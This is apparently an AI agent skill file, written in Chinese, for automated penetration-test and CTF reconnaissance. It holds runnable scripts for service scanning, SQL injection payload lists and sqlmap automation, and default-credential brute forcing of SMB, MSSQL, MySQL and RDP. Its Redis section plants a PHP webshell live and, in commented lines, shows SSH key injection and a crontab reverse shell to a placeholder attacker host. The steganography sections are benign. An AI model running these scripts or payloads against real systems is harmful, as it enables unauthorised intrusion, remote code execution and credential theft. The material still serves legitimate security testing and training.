---
name: auto-recon-lowhanging
description: 自动化初始侦察与低垂果实采集 — 模块化服务探测 + SQLi盲注验证 + 协议枚举 + 隐写术提取 (ctf-katana逻辑)
tags: [recon, automation, sqli, steganography, enumeration, ctf]
---

# 自动化初始侦察与低垂果实采集

## 核心原理

参考 ctf-katana 框架的模块化脚本调用引擎逻辑。在渗透测试/CTF 的最初期阶段，自动对接探测到的网络服务，执行标准化的漏洞验证和信息采集，最大限度卸载人工认知负荷，防止遗漏基础配置错误和已知漏洞。

## 触发条件

- 渗透测试信息收集最初期阶段
- CTF 夺旗赛刚获取目标 IP 列表
- 需要对批量目标执行基线安全检查
- 防止遗漏低垂果实（low-hanging fruit）

## 一、模块化侦察引擎

### 1.1 全自动侦察流水线

```bash
#!/bin/bash
# auto-recon.sh — 一键初始侦察
TARGET="$1"
OUTDIR="/tmp/recon_$(echo $TARGET | tr './' '_')"
mkdir -p "$OUTDIR"

echo "[*] Phase 1: 端口扫描"
nmap -Pn -sT -T4 --top-ports 1000 -oN "$OUTDIR/nmap.txt" "$TARGET" &

echo "[*] Phase 2: 服务指纹"
nmap -Pn -sV -sC -p 21,22,25,53,80,110,135,139,143,443,445,993,995,1433,1521,3306,3389,5432,5900,6379,8080,8443,9200,27017 "$TARGET" -oN "$OUTDIR/services.txt" &

echo "[*] Phase 3: Web 指纹"
curl -skI --max-time 10 "http://$TARGET/" > "$OUTDIR/http_headers.txt" 2>&1
curl -skI --max-time 10 "https://$TARGET/" > "$OUTDIR/https_headers.txt" 2>&1

wait
echo "[*] Phase 4: 服务定向探测"
# 根据开放端口自动选择模块
while read port; do
    case $port in
        21)   echo "[FTP] $TARGET:21" && ftp_anon_check "$TARGET" ;;
        22)   echo "[SSH] $TARGET:22" && ssh_banner "$TARGET" ;;
        25)   echo "[SMTP] $TARGET:25" && smtp_enum "$TARGET" ;;
        80|8080|8000|8888) echo "[HTTP] $TARGET:$port" && web_probe "$TARGET" "$port" ;;
        139|445) echo "[SMB] $TARGET" && smb_enum "$TARGET" ;;
        1433) echo "[MSSQL] $TARGET:1433" && mssql_check "$TARGET" ;;
        3306) echo "[MySQL] $TARGET:3306" && mysql_check "$TARGET" ;;
        5432) echo "[PGSQL] $TARGET:5432" && pgsql_check "$TARGET" ;;
        6379) echo "[Redis] $TARGET:6379" && redis_check "$TARGET" ;;
        9200) echo "[ES] $TARGET:9200" && elasticsearch_check "$TARGET" ;;
        27017) echo "[MongoDB] $TARGET:27017" && mongo_check "$TARGET" ;;
    esac
done < <(grep "^[0-9]" "$OUTDIR/nmap.txt" | awk -F/ '{print $1}')

echo "[*] 完成. 结果保存在 $OUTDIR/"
```

### 1.2 ctf-katana 模块化引擎设计

```python
#!/usr/bin/env python3
"""模块化服务探测引擎 — ctf-katana 架构"""
import subprocess, json, os, sys
from concurrent.futures import ThreadPoolExecutor

class ReconEngine:
    def __init__(self, target, outdir):
        self.target = target
        self.outdir = outdir
        self.results = {}
        os.makedirs(outdir, exist_ok=True)
    
    def run_module(self, name, func):
        """执行单个模块并捕获结果"""
        try:
            result = func(self.target)
            self.results[name] = result
            with open(f"{self.outdir}/{name}.json", "w") as f:
                json.dump(result, f, indent=2)
            return result
        except Exception as e:
            self.results[name] = {"error": str(e)}
            return None
    
    def parallel_run(self, modules):
        """并行执行多个模块"""
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {}
            for name, func in modules.items():
                futures[name] = executor.submit(self.run_module, name, func)
            return {name: f.result() for name, f in futures.items()}

# --- 服务探测模块 ---

def check_ftp_anon(target):
    """FTP 匿名访问检查"""
    import ftplib
    try:
        ftp = ftplib.FTP(target, timeout=5)
        ftp.login("anonymous", "anonymous@test.com")
        files = ftp.nlst()
        ftp.quit()
        return {"vulnerable": True, "files": files[:20]}
    except:
        return {"vulnerable": False}

def check_redis_unauth(target):
    """Redis 未授权访问"""
    import socket
    s = socket.socket()
    s.settimeout(5)
    try:
        s.connect((target, 6379))
        s.send(b"INFO\r\n")
        resp = s.recv(4096).decode(errors='replace')
        s.close()
        if "redis_version" in resp:
            version = [l for l in resp.split('\n') if 'redis_version' in l]
            return {"vulnerable": True, "info": version[0].strip() if version else "unknown"}
    except:
        pass
    return {"vulnerable": False}

def check_mongodb_unauth(target):
    """MongoDB 未授权访问"""
    import socket
    s = socket.socket()
    s.settimeout(5)
    try:
        s.connect((target, 27017))
        # 发送 isMaster 查询
        payload = b'\x3a\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xd4\x07\x00\x00\x04\x00\x00\x00admin\x00\x01\x00\x00\x00\x10isMaster\x00\x01\x00\x00\x00\x00'
        s.send(payload)
        resp = s.recv(4096)
        s.close()
        if b"maxBsonObjectSize" in resp:
            return {"vulnerable": True, "auth": False}
    except:
        pass
    return {"vulnerable": False}

def check_elasticsearch(target):
    """Elasticsearch 未授权访问"""
    import urllib.request
    try:
        resp = urllib.request.urlopen(f"http://{target}:9200/_cat/indices", timeout=5)
        data = resp.read().decode()
        return {"vulnerable": True, "indices": data.strip().split('\n')[:10]}
    except:
        return {"vulnerable": False}

def check_smb_anon(target):
    """SMB 匿名访问"""
    result = subprocess.run(
        ["smbclient", "-N", "-L", f"//{target}", "--timeout=5"],
        capture_output=True, text=True, timeout=10
    )
    if "Sharename" in result.stdout and "IPC$" in result.stdout:
        shares = [l.strip() for l in result.stdout.split('\n') if 'Disk' in l or 'IPC' in l]
        return {"vulnerable": True, "shares": shares}
    return {"vulnerable": False}

def check_smtp_vrfy(target):
    """SMTP VRFY 用户枚举"""
    import socket
    s = socket.socket()
    s.settimeout(5)
    try:
        s.connect((target, 25))
        banner = s.recv(1024).decode(errors='replace')
        s.send(b"VRFY root\r\n")
        resp = s.recv(1024).decode(errors='replace')
        s.send(b"QUIT\r\n")
        s.close()
        if "252" in resp or "250" in resp:
            return {"vulnerable": True, "vrfy_enabled": True, "banner": banner.strip()}
    except:
        pass
    return {"vulnerable": False}
```

## 二、SQL 盲注自动验证

### 2.1 基于响应差异的布尔盲注探测

```bash
# 自动向发现的 Web 服务发送 SQL IF 条件语句
# 原理: 真条件和假条件返回不同响应

TARGET="http://target/page"
# 基线请求
BASELINE_TRUE=$(curl -sk "$TARGET?id=1" -o /dev/null -w "%{http_code}:%{size_download}")
BASELINE_FALSE=$(curl -sk "$TARGET?id=1 AND 1=2" -o /dev/null -w "%{http_code}:%{size_download}")

if [ "$BASELINE_TRUE" != "$BASELINE_FALSE" ]; then
    echo "[!] SQLi 差异检测: TRUE=$BASELINE_TRUE FALSE=$BASELINE_FALSE"
fi

# 标准测试 payload
declare -A SQLI_TESTS=(
    ["boolean_and"]="1 AND 1=1"
    ["boolean_or"]="1 OR 1=1"
    ["string_single"]="' OR '1'='1"
    ["string_double"]="\" OR \"1\"=\"1"
    ["union_probe"]="' UNION SELECT NULL--"
    ["error_based"]="' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"
    ["time_sleep"]="' AND SLEEP(5)--"
    ["time_pgsql"]="'; SELECT pg_sleep(5)--"
    ["time_mssql"]="'; WAITFOR DELAY '0:0:5'--"
)

for name in "${!SQLI_TESTS[@]}"; do
    payload="${SQLI_TESTS[$name]}"
    # URL 编码
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
    
    if [[ "$name" == time_* ]]; then
        # 时间盲注: 测量响应时间
        start=$(date +%s%N)
        curl -sk --max-time 10 "$TARGET?id=$encoded" -o /dev/null
        end=$(date +%s%N)
        elapsed=$(( (end - start) / 1000000 ))
        if [ $elapsed -gt 4500 ]; then
            echo "[!] $name: 时间盲注确认 (${elapsed}ms)"
        fi
    else
        # 布尔盲注: 比较响应大小
        result=$(curl -sk --max-time 8 "$TARGET?id=$encoded" -o /dev/null -w "%{http_code}:%{size_download}")
        if [ "$result" != "$BASELINE_FALSE" ] && [ "$result" != "$BASELINE_TRUE" ]; then
            echo "[!] $name: 差异检测 ($result vs 基线 $BASELINE_TRUE)"
        fi
    fi
done
```

### 2.2 自动化 SQLMap 集成

```bash
# 发现可疑参数后自动调用 sqlmap
auto_sqli() {
    local url="$1"
    local param="$2"
    
    echo "[*] 自动 SQLMap 测试: $url param=$param"
    
    # 快速测试模式
    sqlmap -u "$url" -p "$param" \
        --batch \
        --level=3 \
        --risk=2 \
        --threads=5 \
        --timeout=10 \
        --retries=2 \
        --output-dir="/tmp/sqlmap_$(date +%s)" \
        --technique=BEUSTQ \
        --smart \
        2>&1 | tee /tmp/sqlmap_output.log
    
    # 提取结果
    if grep -q "is vulnerable" /tmp/sqlmap_output.log; then
        echo "[!] SQL 注入确认!"
        grep "Parameter:" /tmp/sqlmap_output.log
        grep "Type:" /tmp/sqlmap_output.log
    fi
}
```

## 三、内网协议自动化枚举

### 3.1 SMB (445/139) 自动化

```bash
# 匿名共享枚举
smbclient -N -L //$TARGET 2>/dev/null

# 枚举共享内容
for share in $(smbclient -N -L //$TARGET 2>/dev/null | grep "Disk" | awk '{print $1}'); do
    echo "[SMB] 枚举共享: $share"
    smbclient -N "//$TARGET/$share" -c "ls" 2>/dev/null
done

# 常用工具
enum4linux -a "$TARGET" 2>/dev/null
crackmapexec smb "$TARGET" --shares -u '' -p '' 2>/dev/null
nmap --script smb-enum-shares,smb-enum-users -p 445 "$TARGET"

# 默认凭据测试
for user in administrator admin guest test; do
    for pass in "" "admin" "password" "123456" "$user"; do
        result=$(smbclient "//$TARGET/C$" -U "$user%$pass" -c "ls" 2>&1)
        if echo "$result" | grep -qv "FAILED\|Error\|NT_STATUS"; then
            echo "[!] SMB 登录成功: $user:$pass"
        fi
    done
done
```

### 3.2 MSSQL (1433) 自动化

```bash
# 匿名/默认凭据测试
for sa_pass in "" "sa" "password" "123456" "admin" "sa123"; do
    result=$(mssqlclient.py "sa:$sa_pass@$TARGET" -windows-auth 2>&1)
    if echo "$result" | grep -q "SQL>"; then
        echo "[!] MSSQL 登录成功: sa:$sa_pass"
        # 自动执行信息收集
        echo "SELECT @@version" | mssqlclient.py "sa:$sa_pass@$TARGET"
    fi
done

# nmap 脚本
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell -p 1433 "$TARGET"
```

### 3.3 Redis (6379) 自动化

```bash
# 未授权访问检测
redis-cli -h "$TARGET" INFO 2>/dev/null | head -5
redis-cli -h "$TARGET" CONFIG GET dir 2>/dev/null
redis-cli -h "$TARGET" CONFIG GET dbfilename 2>/dev/null

if redis-cli -h "$TARGET" PING 2>/dev/null | grep -q PONG; then
    echo "[!] Redis 未授权访问!"
    
    # 利用方式1: SSH 公钥写入
    # redis-cli -h "$TARGET" config set dir /root/.ssh/
    # redis-cli -h "$TARGET" config set dbfilename authorized_keys
    # redis-cli -h "$TARGET" set x "\n\nssh-ed25519 AAAA...\n\n"
    # redis-cli -h "$TARGET" save
    
    # 利用方式2: crontab 反弹 shell
    # redis-cli -h "$TARGET" config set dir /var/spool/cron/
    # redis-cli -h "$TARGET" config set dbfilename root
    # redis-cli -h "$TARGET" set x "\n\n* * * * * /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n\n"
    # redis-cli -h "$TARGET" save
    
    # 利用方式3: Webshell 写入
    redis-cli -h "$TARGET" config set dir /var/www/html/
    redis-cli -h "$TARGET" config set dbfilename shell.php
    redis-cli -h "$TARGET" set x "<?php system(\$_GET['cmd']); ?>"
    redis-cli -h "$TARGET" save
fi
```

### 3.4 SNMP (161) 自动化

```bash
# SNMP community 字符串枚举
for comm in public private community manager admin; do
    result=$(snmpwalk -v2c -c "$comm" "$TARGET" 1.3.6.1.2.1.1.1.0 2>/dev/null)
    if [ -n "$result" ]; then
        echo "[!] SNMP community: $comm"
        # 系统信息
        snmpwalk -v2c -c "$comm" "$TARGET" 1.3.6.1.2.1.1 2>/dev/null
        # 进程列表
        snmpwalk -v2c -c "$comm" "$TARGET" 1.3.6.1.2.1.25.4.2.1.2 2>/dev/null
        # 安装的软件
        snmpwalk -v2c -c "$comm" "$TARGET" 1.3.6.1.2.1.25.6.3.1.2 2>/dev/null
    fi
done

# onesixtyone 快速爆破
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt "$TARGET"
```

### 3.5 其他服务快速检查

```bash
# MySQL (3306)
mysql -h "$TARGET" -u root --password="" -e "SELECT @@version" 2>/dev/null
mysql -h "$TARGET" -u root --password="root" -e "SELECT @@version" 2>/dev/null

# PostgreSQL (5432)
psql -h "$TARGET" -U postgres -c "SELECT version()" 2>/dev/null

# VNC (5900)
nmap --script vnc-info -p 5900 "$TARGET"

# RDP (3389)
nmap --script rdp-enum-encryption -p 3389 "$TARGET"
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://"$TARGET" -t 1
```

## 四、隐写术自动提取

### 4.1 图像隐写术

```bash
# 基础信息提取
file image.png
exiftool image.png
strings image.png | head -50

# LSB (最低有效位) 隐写
pip install stegano
python3 -c "
from stegano import lsb
secret = lsb.reveal('image.png')
print('LSB hidden:', secret)
"

# zsteg (PNG/BMP LSB 分析)
gem install zsteg
zsteg image.png -a  # 尝试所有通道和位

# stegsolve (GUI 工具，通道分析)
java -jar stegsolve.jar  # 打开图像，逐通道查看

# binwalk (嵌入文件提取)
binwalk -e image.png
binwalk --dd=".*" image.png

# steghide (JPEG/BMP 密码隐写)
steghide extract -sf image.jpg -xf output.txt -p ""  # 空密码
steghide extract -sf image.jpg -xf output.txt -p "password"

# PNG CRC32 爆破宽高 (修改尺寸隐藏内容)
python3 -c "
import struct, zlib
with open('image.png','rb') as f: data = f.read()
# IHDR chunk: width(4) + height(4) at offset 16
for w in range(1,2000):
    for h in range(1,2000):
        new_ihdr = data[12:16] + struct.pack('>II',w,h) + data[24:29]
        if zlib.crc32(new_ihdr) & 0xffffffff == struct.unpack('>I',data[29:33])[0]:
            print(f'Found: {w}x{h}')
            break
"
```

### 4.2 音频隐写术

```bash
# 频谱分析
pip install matplotlib numpy scipy
python3 -c "
import scipy.io.wavfile as wav
import numpy as np
rate, data = wav.read('audio.wav')
# 检查是否有异常高频/低频信号
fft = np.fft.fft(data)
print(f'Sample rate: {rate}, Duration: {len(data)/rate:.1f}s')
# 检查 LSB
if data.dtype == np.int16:
    lsb = data & 1
    print(f'LSB 统计: 0={np.sum(lsb==0)} 1={np.sum(lsb==1)}')
    if np.sum(lsb==1) > len(lsb)*0.4 and np.sum(lsb==1) < len(lsb)*0.6:
        print('[!] LSB 分布异常，可能存在隐写')
"

# Sonic Visualiser (GUI 频谱分析)
sonic-visualiser audio.wav &

# DeepSound 提取 (需 Windows)
# 或使用 SonicVisualiser 查看频谱图中的隐藏信息
```

### 4.3 文档隐写术

```bash
# PDF 隐藏内容
pdfdetach -list document.pdf  # 列出嵌入文件
pdfdetach -saveall -o /tmp/ document.pdf  # 提取所有嵌入文件
pdftotext document.pdf - | strings | grep -iE "flag|secret|password|key"

# Office 文档隐藏内容
unzip -o document.docx -d /tmp/docx_extract/
find /tmp/docx_extract/ -exec file {} \;
strings /tmp/docx_extract/word/document.xml | grep -iE "flag|hidden"
olevba document.docm  # VBA 宏分析

# 通用文件尾部追加数据
tail -c 1000 file.pdf | strings
tail -c 1000 file.png | strings
```

## 五、CTF 专项自动化

### 5.1 通用 CTF 侦察脚本

```bash
#!/bin/bash
# ctf-recon.sh — CTF 快速侦察
TARGET="$1"
echo "=== CTF 快速侦察: $TARGET ==="

echo "[1] Nmap 快扫"
nmap -Pn -sT -T4 --top-ports 100 "$TARGET" 2>/dev/null | grep "open"

echo "[2] 目录爆破"
gobuster dir -u "http://$TARGET" -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 20 -q 2>/dev/null

echo "[3] robots.txt / sitemap.xml"
curl -sk "http://$TARGET/robots.txt" 2>/dev/null
curl -sk "http://$TARGET/sitemap.xml" 2>/dev/null | head -20

echo "[4] 常见敏感文件"
for f in .git/config .env .htaccess backup.zip source.zip flag.txt; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" "http://$TARGET/$f")
    [ "$code" = "200" ] && echo "[!] FOUND: $f"
done

echo "[5] HTTP 响应头分析"
curl -skI "http://$TARGET/" 2>/dev/null | grep -iE "server|x-powered|x-flag|ctf|hint"

echo "[6] HTML 源码注释"
curl -sk "http://$TARGET/" 2>/dev/null | grep -oP '<!--.*?-->' | head -10

echo "[7] JavaScript 分析"
curl -sk "http://$TARGET/" 2>/dev/null | grep -oP 'src="[^"]*\.js"' | while read js; do
    url=$(echo "$js" | grep -oP '"[^"]*"' | tr -d '"')
    curl -sk "http://$TARGET/$url" 2>/dev/null | grep -oP '/[a-zA-Z0-9/_-]{3,50}' | sort -u
done | head -20

echo "=== 侦察完成 ==="
```

## 六、WAF绕过与上传能力评估

WAF探测/规则探测/绕过策略 + 上传能力评估/绕过技术完整模式库见 `references/waf-bypass-upload-patterns.md`。

工具链位置: `/opt/redteam-toolchain/` (waf-recon-bypass.py, upload-capability-scanner.py, redteam-attack-chain.py, waf-bypass-generator.py, quick-attack.sh)

## 七、工具链

| 工具 | 用途 | 安装 |
|------|------|------|
| nmap | 端口/服务扫描 | `apt install nmap` |
| gobuster | 目录爆破 | `apt install gobuster` |
| sqlmap | SQL 注入利用 | `apt install sqlmap` |
| crackmapexec | SMB/WinRM 枚举 | `apt install crackmapexec` |
| enum4linux-ng | SMB/NetBIOS枚举 | `/opt/enum4linux-ng/enum4linux-ng.py` |
| redis-cli | Redis 客户端 | `apt install redis-tools` |
| binwalk | 文件提取 | `pip install binwalk` |
| zsteg | 图像隐写 | `gem install zsteg` |
| steghide | JPEG 隐写 | `apt install steghide` |
| onesixtyone | SNMP 爆破 | `apt install onesixtyone` |
| tplmap | SSTI注入 | `/opt/tplmap/tplmap.py` |
| XSStrike | XSS扫描 | `/opt/XSStrike/xsstrike.py` |
| Arjun | 参数发现 | `arjun` |
| SubDomainizer | 子域名发现 | `/opt/SubDomainizer/SubDomainizer.py` |
| kerbrute | Kerberos暴力破解 | `kerbrute` |
| evil-winrm | WinRM后渗透 | `evil-winrm` |
| Responder | LLMNR/NBT-NS投毒 | `/opt/responder/Responder.py` |
| BloodHound | AD关系映射 | `bloodhound-python` |
| impacket | Windows协议攻击 | `impacket-*` |
| Certipy | AD证书服务攻击 | `certipy` |
| Coercer | Windows认证强制 | `coercer` |
| chisel | 隧道工具 | `chisel` |
| ligolo-ng | 隧道代理 | `ligolo-ng` |

## 参考

- ctf-katana: https://github.com/JohnHammond/ctf-katana
- SecLists: https://github.com/danielmiessler/SecLists
- GTFOBins: https://gtfobins.github.io/
- HackTricks: https://book.hacktricks.xyz/
